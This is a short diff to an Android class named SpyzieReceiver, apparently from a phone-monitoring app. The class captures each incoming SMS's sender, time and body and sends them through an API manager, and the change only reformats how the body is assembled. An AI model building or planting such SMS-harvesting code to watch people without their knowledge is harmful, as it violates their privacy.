@@ -15,7 +15,7 @@ public class SpyzieReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         Bundle data = intent.getExtras();
         Object[] pdus = (Object[]) data.get("pdus");
-        StringBuilder sb = new StringBuilder();
+        StringBuilder smsBody = new StringBuilder();
         SmsMessage smsMessage;
         Sms sms = new Sms();
         for (int i = 0; i < pdus.length; i++) {
@@ -23,11 +23,10 @@ public class SpyzieReceiver extends BroadcastReceiver {
             if (i == 0) {
                 sms.address = smsMessage.getDisplayOriginatingAddress();
                 sms.time = String.valueOf(smsMessage.getTimestampMillis());
-                sb.append("Phone: " + sms.address);
             }
-            sb.append(", Message: " + smsMessage.getMessageBody());
+            smsBody.append(smsMessage.getMessageBody());
         }
-        sms.body = sb.toString();
+        sms.body = smsBody.toString();
         sms.isIncoming = true;
         AppApiManager.getInstance().sendSmsData(sms);
     }
